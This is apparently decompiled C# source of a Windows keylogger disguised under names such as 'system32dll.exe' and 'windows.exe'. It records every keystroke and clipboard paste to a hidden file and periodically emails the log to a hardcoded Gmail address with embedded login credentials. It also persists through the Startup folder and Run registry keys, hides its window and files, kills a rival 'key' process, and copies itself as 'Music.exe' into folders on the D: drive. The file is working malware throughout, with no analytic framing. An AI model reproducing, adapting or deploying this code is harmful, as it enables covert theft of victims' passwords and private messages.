using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using system32dll.My;

namespace system32dll;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("Timer6")]
	private Timer _Timer6;

	[AccessedThroughProperty("tmrkey")]
	private Timer _tmrkey;

	[AccessedThroughProperty("Timer3")]
	private Timer _Timer3;

	[AccessedThroughProperty("Tmrsending")]
	private Timer _Tmrsending;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("lblfilename")]
	private Label _lblfilename;

	[AccessedThroughProperty("timerupdate")]
	private Timer _timerupdate;

	private int result;

	internal virtual Timer Timer6
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer6_Tick;
			if (_Timer6 != null)
			{
				_Timer6.remove_Tick(eventHandler);
			}
			_Timer6 = value;
			if (_Timer6 != null)
			{
				_Timer6.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer tmrkey
	{
		[DebuggerNonUserCode]
		get
		{
			return _tmrkey;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = tmrkey_Tick;
			if (_tmrkey != null)
			{
				_tmrkey.remove_Tick(eventHandler);
			}
			_tmrkey = value;
			if (_tmrkey != null)
			{
				_tmrkey.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer3_Tick;
			if (_Timer3 != null)
			{
				_Timer3.remove_Tick(eventHandler);
			}
			_Timer3 = value;
			if (_Timer3 != null)
			{
				_Timer3.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Tmrsending
	{
		[DebuggerNonUserCode]
		get
		{
			return _Tmrsending;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			if (_Tmrsending != null)
			{
				_Tmrsending.remove_Tick(eventHandler);
			}
			_Tmrsending = value;
			if (_Tmrsending != null)
			{
				_Tmrsending.add_Tick(eventHandler);
			}
		}
	}

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual Label lblfilename
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblfilename;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblfilename = value;
		}
	}

	internal virtual Timer timerupdate
	{
		[DebuggerNonUserCode]
		get
		{
			return _timerupdate;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = timerupdate_Tick;
			if (_timerupdate != null)
			{
				_timerupdate.remove_Tick(eventHandler);
			}
			_timerupdate = value;
			if (_timerupdate != null)
			{
				_timerupdate.add_Tick(eventHandler);
			}
		}
	}

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0065: Expected O, but got Unknown
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Expected O, but got Unknown
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		//IL_0082: Unknown result type (might be due to invalid IL or missing references)
		//IL_008c: Expected O, but got Unknown
		components = new Container();
		Timer6 = new Timer(components);
		tmrkey = new Timer(components);
		Timer3 = new Timer(components);
		Tmrsending = new Timer(components);
		TextBox1 = new TextBox();
		Label1 = new Label();
		Label2 = new Label();
		lblfilename = new Label();
		timerupdate = new Timer(components);
		((Control)this).SuspendLayout();
		Timer6.set_Interval(1000);
		tmrkey.set_Interval(10);
		Timer3.set_Interval(1);
		TextBox textBox = TextBox1;
		Point location = new Point(64, 137);
		((Control)textBox).set_Location(location);
		TextBox1.set_Multiline(true);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		Size size = new Size(319, 125);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(0);
		((Control)TextBox1).set_Visible(false);
		Label1.set_AutoSize(true);
		Label label = Label1;
		location = new Point(344, 98);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(39, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(1);
		Label1.set_Text("Label1");
		((Control)Label1).set_Visible(false);
		Label2.set_AutoSize(true);
		Label label3 = Label2;
		location = new Point(75, 98);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(39, 13);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(5);
		Label2.set_Text("Label2");
		((Control)Label2).set_Visible(false);
		lblfilename.set_AutoSize(true);
		Label obj = lblfilename;
		location = new Point(201, 98);
		((Control)obj).set_Location(location);
		((Control)lblfilename).set_Name("lblfilename");
		Label obj2 = lblfilename;
		size = new Size(46, 13);
		((Control)obj2).set_Size(size);
		((Control)lblfilename).set_TabIndex(6);
		lblfilename.set_Text("filename");
		((Control)lblfilename).set_Visible(false);
		timerupdate.set_Interval(10);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(468, 337);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)lblfilename);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DllImport("USER32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetAsyncKeyState(int vKey);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetKeyState(int nVirtKey);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_Load(object sender, EventArgs e)
	{
		timerupdate.Start();
		Timer3.Start();
		Size size = new Size(0, 0);
		((Form)this).set_Size(size);
		lblfilename.set_Text("C:\\users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\");
		if (!File.Exists(lblfilename.get_Text() + "Windows\\Start Menu\\Programs\\Startup\\system32dll.exe"))
		{
			FileSystem.FileCopy(Application.get_ExecutablePath(), lblfilename.get_Text() + "Windows\\Start Menu\\Programs\\Startup\\system32dll.exe");
		}
		if (File.Exists(lblfilename.get_Text() + "fv.rj"))
		{
			string text = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(lblfilename.get_Text() + "fv.rj").Trim();
			string fileVersion = FileVersionInfo.GetVersionInfo(Application.get_ExecutablePath()).FileVersion;
			if (!text.Equals(fileVersion))
			{
				string executablePath = Application.get_ExecutablePath();
				executablePath = Path.GetDirectoryName(executablePath);
				if (executablePath.Equals(lblfilename.get_Text()))
				{
					File.Copy(Application.get_ExecutablePath(), lblfilename.get_Text() + "Windows\\windows.exe", overwrite: true);
				}
				else
				{
					File.Copy(Application.get_ExecutablePath(), lblfilename.get_Text() + "system32dll.exe", overwrite: true);
				}
			}
		}
		else
		{
			FileStream fileStream = new FileStream(lblfilename.get_Text() + "fv.rj", FileMode.Create, FileAccess.Write);
			StreamWriter streamWriter = new StreamWriter(fileStream);
			streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
			streamWriter.WriteLine(FileVersionInfo.GetVersionInfo(Application.get_ExecutablePath()).FileVersion);
			streamWriter.Close();
			fileStream.Close();
			hidefile(lblfilename.get_Text() + "fv.rj");
		}
		if (!File.Exists(lblfilename.get_Text() + "system32dll.exe"))
		{
			FileSystem.FileCopy(Application.get_ExecutablePath(), lblfilename.get_Text() + "system32dll.exe");
		}
		hidefile(lblfilename.get_Text() + "system32dll.exe");
		((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Application.get_ProductName(), (object)(lblfilename.get_Text() + "system32dll.exe"));
		if (!File.Exists(lblfilename.get_Text() + "Windows\\windows.exe"))
		{
			FileSystem.FileCopy(Application.get_ExecutablePath(), lblfilename.get_Text() + "Windows\\windows.exe");
		}
		hidefile(lblfilename.get_Text() + "Windows\\windows.exe");
		((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "windows", (object)(lblfilename.get_Text() + "Windows\\windows.exe"));
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			try
			{
				if (Operators.CompareString(process.MainModule!.FileVersionInfo.FileDescription, "key", false) == 0)
				{
					string fileName = process.MainModule!.FileName;
					process.Kill();
					File.Delete(fileName);
					((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue("key");
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			string[] directories = Directory.GetDirectories("D:\\");
			foreach (string text2 in directories)
			{
				try
				{
					if (!File.Exists(text2 + "\\Music.exe"))
					{
						FileSystem.FileCopy(Application.get_ExecutablePath(), text2 + "\\Music.exe");
						break;
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		Label1.set_Text(DateTime.Now.AddMinutes(5.0).ToString());
		tmrkey.Start();
		Tmrsending.Start();
		Timer6.Start();
	}

	public bool GetCapslock()
	{
		return (GetKeyState(20) & 1) != 0;
	}

	public bool GetShift()
	{
		return GetAsyncKeyState(16) != 0;
	}

	public bool Getctrl()
	{
		return GetAsyncKeyState(17) != 0;
	}

	private void tmrkey_Tick(object sender, EventArgs e)
	{
		int num = 1;
		checked
		{
			int num2;
			do
			{
				result = 0;
				result = GetAsyncKeyState(num);
				if (result == -32767)
				{
					Label2.set_Text("1");
					if (GetCapslock() & GetShift())
					{
						switch (num)
						{
						case 1:
							MainEvents();
							break;
						case 8:
							if (Operators.CompareString(TextBox1.get_Text(), "", false) != 0)
							{
								TextBox1.set_Text(Strings.Mid(TextBox1.get_Text(), 1, Strings.Len(TextBox1.get_Text()) - 1));
							}
							break;
						case 9:
							TextBox1.set_Text(TextBox1.get_Text() + "   ");
							break;
						case 13:
							MainEvents();
							break;
						case 32:
							TextBox1.set_Text(TextBox1.get_Text() + " ");
							break;
						case 48:
							TextBox1.set_Text(TextBox1.get_Text() + ")");
							break;
						case 49:
							TextBox1.set_Text(TextBox1.get_Text() + "!");
							break;
						case 50:
							TextBox1.set_Text(TextBox1.get_Text() + "@");
							break;
						case 51:
							TextBox1.set_Text(TextBox1.get_Text() + "#");
							break;
						case 52:
							TextBox1.set_Text(TextBox1.get_Text() + "$");
							break;
						case 53:
							TextBox1.set_Text(TextBox1.get_Text() + "%");
							break;
						case 54:
							TextBox1.set_Text(TextBox1.get_Text() + "^");
							break;
						case 55:
							TextBox1.set_Text(TextBox1.get_Text() + "&");
							break;
						case 56:
							TextBox1.set_Text(TextBox1.get_Text() + "*");
							break;
						case 57:
							TextBox1.set_Text(TextBox1.get_Text() + "(");
							break;
						case 64:
						case 65:
						case 66:
						case 67:
						case 68:
						case 69:
						case 70:
						case 71:
						case 72:
						case 73:
						case 74:
						case 75:
						case 76:
						case 77:
						case 78:
						case 79:
						case 80:
						case 81:
						case 82:
						case 83:
						case 84:
						case 85:
						case 86:
						case 87:
						case 88:
						case 89:
						case 90:
							if (Getctrl())
							{
								if (num == 86)
								{
									TextBox1.set_Text(TextBox1.get_Text() + Clipboard.GetText());
								}
							}
							else
							{
								TextBox1.set_Text(TextBox1.get_Text() + Strings.Chr(num).ToString().ToLower());
							}
							break;
						case 96:
						case 97:
						case 98:
						case 99:
						case 100:
						case 101:
						case 102:
						case 103:
						case 104:
						case 105:
							TextBox1.set_Text(TextBox1.get_Text() + Conversions.ToString(Strings.Chr(num - 48)));
							break;
						case 106:
						case 107:
						case 108:
						case 109:
						case 110:
						case 111:
							TextBox1.set_Text(TextBox1.get_Text() + Conversions.ToString(Strings.Chr(num - 64)));
							break;
						case 186:
							TextBox1.set_Text(TextBox1.get_Text() + ":");
							break;
						case 187:
							TextBox1.set_Text(TextBox1.get_Text() + "+");
							break;
						case 188:
							TextBox1.set_Text(TextBox1.get_Text() + "<");
							break;
						case 189:
							TextBox1.set_Text(TextBox1.get_Text() + "_");
							break;
						case 190:
							TextBox1.set_Text(TextBox1.get_Text() + ">");
							break;
						case 191:
							TextBox1.set_Text(TextBox1.get_Text() + "?");
							break;
						case 192:
							TextBox1.set_Text(TextBox1.get_Text() + "~");
							break;
						default:
							TextBox1.set_Text(TextBox1.get_Text() + " Ascii(" + num + ") ");
							break;
						case 219:
							TextBox1.set_Text(TextBox1.get_Text() + "{");
							break;
						case 220:
							TextBox1.set_Text(TextBox1.get_Text() + "|");
							break;
						case 221:
							TextBox1.set_Text(TextBox1.get_Text() + "}");
							break;
						case 222:
							TextBox1.set_Text(TextBox1.get_Text() + "\"");
							break;
						case 2:
						case 16:
						case 17:
						case 18:
						case 20:
						case 27:
						case 33:
						case 34:
						case 35:
						case 36:
						case 37:
						case 38:
						case 39:
						case 40:
						case 44:
						case 45:
						case 46:
						case 91:
						case 112:
						case 113:
						case 114:
						case 115:
						case 116:
						case 117:
						case 118:
						case 119:
						case 120:
						case 121:
						case 122:
						case 123:
						case 144:
						case 160:
						case 161:
						case 162:
						case 163:
						case 164:
						case 165:
							break;
						}
					}
					if (GetCapslock() & !GetShift())
					{
						switch (num)
						{
						case 1:
							MainEvents();
							break;
						case 8:
							if (Operators.CompareString(TextBox1.get_Text(), "", false) != 0)
							{
								TextBox1.set_Text(Strings.Mid(TextBox1.get_Text(), 1, Strings.Len(TextBox1.get_Text()) - 1));
							}
							break;
						case 9:
							TextBox1.set_Text(TextBox1.get_Text() + "   ");
							break;
						case 13:
							MainEvents();
							break;
						case 32:
							TextBox1.set_Text(TextBox1.get_Text() + " ");
							break;
						case 48:
						case 49:
						case 50:
						case 51:
						case 52:
						case 53:
						case 54:
						case 55:
						case 56:
						case 57:
							TextBox1.set_Text(TextBox1.get_Text() + Conversions.ToString(Strings.Chr(num)));
							break;
						case 64:
						case 65:
						case 66:
						case 67:
						case 68:
						case 69:
						case 70:
						case 71:
						case 72:
						case 73:
						case 74:
						case 75:
						case 76:
						case 77:
						case 78:
						case 79:
						case 80:
						case 81:
						case 82:
						case 83:
						case 84:
						case 85:
						case 86:
						case 87:
						case 88:
						case 89:
						case 90:
							if (Getctrl())
							{
								if (num == 86)
								{
									TextBox1.set_Text(TextBox1.get_Text() + Clipboard.GetText());
								}
							}
							else
							{
								TextBox1.set_Text(TextBox1.get_Text() + Conversions.ToString(Strings.Chr(num)));
							}
							break;
						case 96:
						case 97:
						case 98:
						case 99:
						case 100:
						case 101:
						case 102:
						case 103:
						case 104:
						case 105:
							TextBox1.set_Text(TextBox1.get_Text() + Conversions.ToString(Strings.Chr(num - 48)));
							break;
						case 106:
						case 107:
						case 108:
						case 109:
						case 110:
						case 111:
							TextBox1.set_Text(TextBox1.get_Text() + Conversions.ToString(Strings.Chr(num - 64)));
							break;
						case 186:
							TextBox1.set_Text(TextBox1.get_Text() + ";");
							break;
						case 187:
							TextBox1.set_Text(TextBox1.get_Text() + "=");
							break;
						case 188:
							TextBox1.set_Text(TextBox1.get_Text() + ",");
							break;
						case 189:
							TextBox1.set_Text(TextBox1.get_Text() + "-");
							break;
						case 190:
							TextBox1.set_Text(TextBox1.get_Text() + ".");
							break;
						case 191:
							TextBox1.set_Text(TextBox1.get_Text() + "/");
							break;
						case 192:
							TextBox1.set_Text(TextBox1.get_Text() + "`");
							break;
						default:
							TextBox1.set_Text(TextBox1.get_Text() + " Ascii(" + num + ") ");
							break;
						case 219:
							TextBox1.set_Text(TextBox1.get_Text() + "[");
							break;
						case 220:
							TextBox1.set_Text(TextBox1.get_Text() + "\\");
							break;
						case 221:
							TextBox1.set_Text(TextBox1.get_Text() + "]");
							break;
						case 222:
							TextBox1.set_Text(TextBox1.get_Text() + "'");
							break;
						case 2:
						case 16:
						case 17:
						case 18:
						case 20:
						case 27:
						case 33:
						case 34:
						case 35:
						case 36:
						case 37:
						case 38:
						case 39:
						case 40:
						case 44:
						case 45:
						case 46:
						case 91:
						case 112:
						case 113:
						case 114:
						case 115:
						case 116:
						case 117:
						case 118:
						case 119:
						case 120:
						case 121:
						case 122:
						case 123:
						case 144:
						case 160:
						case 161:
						case 162:
						case 163:
						case 164:
						case 165:
							break;
						}
					}
					if (!GetCapslock() & GetShift())
					{
						switch (num)
						{
						case 1:
							MainEvents();
							break;
						case 8:
							if (Operators.CompareString(TextBox1.get_Text(), "", false) != 0)
							{
								TextBox1.set_Text(Strings.Mid(TextBox1.get_Text(), 1, Strings.Len(TextBox1.get_Text()) - 1));
							}
							break;
						case 9:
							TextBox1.set_Text(TextBox1.get_Text() + "   ");
							break;
						case 13:
							MainEvents();
							break;
						case 32:
							TextBox1.set_Text(TextBox1.get_Text() + " ");
							break;
						case 48:
							TextBox1.set_Text(TextBox1.get_Text() + ")");
							break;
						case 49:
							TextBox1.set_Text(TextBox1.get_Text() + "!");
							break;
						case 50:
							TextBox1.set_Text(TextBox1.get_Text() + "@");
							break;
						case 51:
							TextBox1.set_Text(TextBox1.get_Text() + "#");
							break;
						case 52:
							TextBox1.set_Text(TextBox1.get_Text() + "$");
							break;
						case 53:
							TextBox1.set_Text(TextBox1.get_Text() + "%");
							break;
						case 54:
							TextBox1.set_Text(TextBox1.get_Text() + "^");
							break;
						case 55:
							TextBox1.set_Text(TextBox1.get_Text() + "&");
							break;
						case 56:
							TextBox1.set_Text(TextBox1.get_Text() + "*");
							break;
						case 57:
							TextBox1.set_Text(TextBox1.get_Text() + "(");
							break;
						case 64:
						case 65:
						case 66:
						case 67:
						case 68:
						case 69:
						case 70:
						case 71:
						case 72:
						case 73:
						case 74:
						case 75:
						case 76:
						case 77:
						case 78:
						case 79:
						case 80:
						case 81:
						case 82:
						case 83:
						case 84:
						case 85:
						case 86:
						case 87:
						case 88:
						case 89:
						case 90:
							if (Getctrl())
							{
								if (num == 86)
								{
									TextBox1.set_Text(TextBox1.get_Text() + Clipboard.GetText());
								}
							}
							else
							{
								TextBox1.set_Text(TextBox1.get_Text() + Conversions.ToString(Strings.Chr(num)));
							}
							break;
						case 96:
						case 97:
						case 98:
						case 99:
						case 100:
						case 101:
						case 102:
						case 103:
						case 104:
						case 105:
							TextBox1.set_Text(TextBox1.get_Text() + Conversions.ToString(Strings.Chr(num - 48)));
							break;
						case 106:
						case 107:
						case 108:
						case 109:
						case 110:
						case 111:
							TextBox1.set_Text(TextBox1.get_Text() + Conversions.ToString(Strings.Chr(num - 64)));
							break;
						case 186:
							TextBox1.set_Text(TextBox1.get_Text() + ":");
							break;
						case 187:
							TextBox1.set_Text(TextBox1.get_Text() + "+");
							break;
						case 188:
							TextBox1.set_Text(TextBox1.get_Text() + "<");
							break;
						case 189:
							TextBox1.set_Text(TextBox1.get_Text() + "_");
							break;
						case 190:
							TextBox1.set_Text(TextBox1.get_Text() + ">");
							break;
						case 191:
							TextBox1.set_Text(TextBox1.get_Text() + "?");
							break;
						case 192:
							TextBox1.set_Text(TextBox1.get_Text() + "~");
							break;
						default:
							TextBox1.set_Text(TextBox1.get_Text() + " Ascii(" + num + ") ");
							break;
						case 219:
							TextBox1.set_Text(TextBox1.get_Text() + "{");
							break;
						case 220:
							TextBox1.set_Text(TextBox1.get_Text() + "|");
							break;
						case 221:
							TextBox1.set_Text(TextBox1.get_Text() + "}");
							break;
						case 222:
							TextBox1.set_Text(TextBox1.get_Text() + "\"");
							break;
						case 2:
						case 16:
						case 17:
						case 18:
						case 20:
						case 27:
						case 33:
						case 34:
						case 35:
						case 36:
						case 37:
						case 38:
						case 39:
						case 40:
						case 44:
						case 45:
						case 46:
						case 91:
						case 112:
						case 113:
						case 114:
						case 115:
						case 116:
						case 117:
						case 118:
						case 119:
						case 120:
						case 121:
						case 122:
						case 123:
						case 144:
						case 160:
						case 161:
						case 162:
						case 163:
						case 164:
						case 165:
							break;
						}
					}
					if (!GetCapslock() & !GetShift())
					{
						switch (num)
						{
						case 2:
						case 16:
						case 17:
						case 18:
						case 20:
						case 27:
						case 33:
						case 34:
						case 35:
						case 36:
						case 37:
						case 38:
						case 39:
						case 40:
						case 44:
						case 45:
						case 46:
						case 91:
						case 112:
						case 113:
						case 114:
						case 115:
						case 116:
						case 117:
						case 118:
						case 119:
						case 120:
						case 121:
						case 122:
						case 123:
						case 144:
						case 160:
						case 161:
						case 162:
						case 163:
						case 164:
						case 165:
							break;
						case 1:
							MainEvents();
							break;
						case 8:
							if (Operators.CompareString(TextBox1.get_Text(), "", false) != 0)
							{
								TextBox1.set_Text(Strings.Mid(TextBox1.get_Text(), 1, Strings.Len(TextBox1.get_Text()) - 1));
							}
							break;
						case 9:
							TextBox1.set_Text(TextBox1.get_Text() + "   ");
							break;
						case 13:
							MainEvents();
							break;
						case 32:
							TextBox1.set_Text(TextBox1.get_Text() + " ");
							break;
						case 48:
						case 49:
						case 50:
						case 51:
						case 52:
						case 53:
						case 54:
						case 55:
						case 56:
						case 57:
							TextBox1.set_Text(TextBox1.get_Text() + Conversions.ToString(Strings.Chr(num)));
							break;
						case 64:
						case 65:
						case 66:
						case 67:
						case 68:
						case 69:
						case 70:
						case 71:
						case 72:
						case 73:
						case 74:
						case 75:
						case 76:
						case 77:
						case 78:
						case 79:
						case 80:
						case 81:
						case 82:
						case 83:
						case 84:
						case 85:
						case 86:
						case 87:
						case 88:
						case 89:
						case 90:
							if (Getctrl())
							{
								if (num == 86)
								{
									TextBox1.set_Text(TextBox1.get_Text() + Clipboard.GetText());
								}
							}
							else
							{
								TextBox1.set_Text(TextBox1.get_Text() + Strings.Chr(num).ToString().ToLower());
							}
							break;
						case 96:
						case 97:
						case 98:
						case 99:
						case 100:
						case 101:
						case 102:
						case 103:
						case 104:
						case 105:
							TextBox1.set_Text(TextBox1.get_Text() + Conversions.ToString(Strings.Chr(num - 48)));
							break;
						case 106:
						case 107:
						case 108:
						case 109:
						case 110:
						case 111:
							TextBox1.set_Text(TextBox1.get_Text() + Conversions.ToString(Strings.Chr(num - 64)));
							break;
						case 186:
							TextBox1.set_Text(TextBox1.get_Text() + ";");
							break;
						case 187:
							TextBox1.set_Text(TextBox1.get_Text() + "=");
							break;
						case 188:
							TextBox1.set_Text(TextBox1.get_Text() + ",");
							break;
						case 189:
							TextBox1.set_Text(TextBox1.get_Text() + "-");
							break;
						case 190:
							TextBox1.set_Text(TextBox1.get_Text() + ".");
							break;
						case 191:
							TextBox1.set_Text(TextBox1.get_Text() + "/");
							break;
						case 192:
							TextBox1.set_Text(TextBox1.get_Text() + "`");
							break;
						default:
							TextBox1.set_Text(TextBox1.get_Text() + " Ascii(" + num + ") ");
							break;
						case 219:
							TextBox1.set_Text(TextBox1.get_Text() + "[");
							break;
						case 220:
							TextBox1.set_Text(TextBox1.get_Text() + "\\");
							break;
						case 221:
							TextBox1.set_Text(TextBox1.get_Text() + "]");
							break;
						case 222:
							TextBox1.set_Text(TextBox1.get_Text() + "'");
							break;
						}
					}
				}
				num++;
				num2 = num;
				int num3 = 225;
			}
			while (num2 <= 225);
		}
	}

	public void send()
	{
		try
		{
			File.Move(lblfilename.get_Text() + "microsoft.rj", lblfilename.get_Text() + "system.data");
			MailMessage mailMessage = new MailMessage();
			mailMessage.From = new MailAddress("hackbyrj@gmail.com");
			mailMessage.To.Add("hackbyrj@gmail.com");
			mailMessage.Subject = Environment.MachineName + "   " + Conversions.ToString(DateTime.Now);
			string text2 = (mailMessage.Body = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(lblfilename.get_Text() + "system.data"));
			SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
			smtpClient.Port = 587;
			smtpClient.EnableSsl = true;
			smtpClient.Credentials = new NetworkCredential("hackbyrj@gmail.com", "rjhacking");
			smtpClient.Send(mailMessage);
			File.Delete(lblfilename.get_Text() + "system.data");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			if (File.Exists(lblfilename.get_Text() + "system.data"))
			{
				File.Delete(lblfilename.get_Text() + "system.data");
			}
			ProjectData.ClearProjectError();
		}
	}

	public void MainEvents()
	{
		try
		{
			string text = TextBox1.get_Text();
			TextBox1.set_Text("");
			if (Operators.CompareString(text, "", false) != 0)
			{
				FileStream fileStream = new FileStream(lblfilename.get_Text() + "microsoft.rj", FileMode.OpenOrCreate, FileAccess.ReadWrite);
				StreamWriter streamWriter = new StreamWriter(fileStream);
				streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
				streamWriter.WriteLine(Conversions.ToString(DateTime.Now) + "   --->  " + text);
				streamWriter.Close();
				fileStream.Close();
				hidefile(lblfilename.get_Text() + "microsoft.rj");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Timer3_Tick(object sender, EventArgs e)
	{
		((Control)this).Hide();
		((Control)this).set_Visible(false);
		Size size = new Size(0, 0);
		((Form)this).set_Size(size);
		((Form)this).set_Text("");
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_TransparencyKey(((Form)this).get_BackColor());
		DriveInfo driveInfo = new DriveInfo(Directory.GetDirectoryRoot(Application.get_ExecutablePath()));
		if ((double)driveInfo.DriveType == Conversions.ToDouble("2"))
		{
			((Form)this).Close();
		}
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		if (Operators.CompareString(Label1.get_Text(), DateTime.Now.ToString(), false) != 0)
		{
			return;
		}
		Tmrsending.Stop();
		if (File.Exists(lblfilename.get_Text() + "microsoft.rj"))
		{
			try
			{
				if (((ServerComputer)MyProject.Computer).get_Network().Ping("www.google.com"))
				{
					Label1.set_Text(DateTime.Now.AddMinutes(30.0).ToString());
					send();
					timerupdate.Start();
				}
				else
				{
					Label1.set_Text(DateTime.Now.AddMinutes(5.0).ToString());
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Label1.set_Text(DateTime.Now.AddMinutes(5.0).ToString());
				ProjectData.ClearProjectError();
			}
		}
		Tmrsending.Start();
	}

	private void hidefile(string filename)
	{
		File.SetAttributes(filename, FileAttributes.Hidden | FileAttributes.System);
	}

